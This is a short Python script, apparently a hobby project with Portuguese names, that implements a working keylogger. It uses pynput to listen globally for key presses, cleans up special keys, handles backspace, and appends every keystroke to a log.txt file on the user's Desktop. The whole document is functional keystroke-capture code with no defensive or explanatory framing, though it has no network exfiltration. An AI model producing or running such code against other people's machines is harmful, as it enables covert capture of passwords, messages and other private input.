from pynput import keyboard
from pathlib import Path
import os

user = os.path.expanduser("~")
caminho = f"{user}\Desktop"

def main(key):

    if str(key) == "Key.backspace":
        with open(f"{caminho}\log.txt", "r") as archive:
            copia = archive.readlines()
        if len(copia) > 0:
            new = copia[-1][:-1]
            copia.pop()
            copia.append(new)
            with open(f"{caminho}\log.txt", "w") as archive:
                archive.writelines(copia)

    teclas = str(key)

    words = {
                "Key.space":" ",
		"Key.enter":"\n",
		"Key.shift_l":"",
		"Key.alt":"",
		"Key.esc": "",
		"Key.cmd":"",
		"Key.caps_lock": "",
                "Key.ctrl_l":"",
                "Key.down":"",
                "Key.up":"",
                "Key.shift_r":"",
                "Key.backspace": "",
		}
    
    teclas = teclas.replace("'", "")
    teclas = teclas.replace("[", "")
    teclas = teclas.replace("]", "")

    for key in words:
        teclas =  teclas.replace(key, words[key])

    with open(f"{caminho}\log.txt", "a") as archive:
        archive.write(teclas)

try:
    with keyboard.Listener(on_press=main) as archive:
        archive.join()

except KeyboardInterrupt:
    print("Programa finalizado com Sucesso!!")